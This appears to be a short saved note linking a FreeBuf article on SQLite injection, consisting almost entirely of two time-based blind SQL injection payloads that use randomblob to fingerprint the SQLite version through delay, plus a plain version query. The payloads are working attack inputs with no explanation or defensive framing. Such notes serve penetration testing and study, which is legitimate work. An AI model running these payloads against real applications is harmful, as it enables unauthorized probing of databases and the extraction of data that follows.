[SQLite注入 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/324785.html)

```
-1' or (case when(substr(sqlite_version(),1,1)>'3') then randomblob(300000000) else 0 end)--
```

```
-1' or (case when(substr(sqlite_version(),1,1)='3') then randomblob(300000000) else 0 end)--
```

```
// 获取版本号
SELECT substr(sqlite_version(), 1, 1);
```

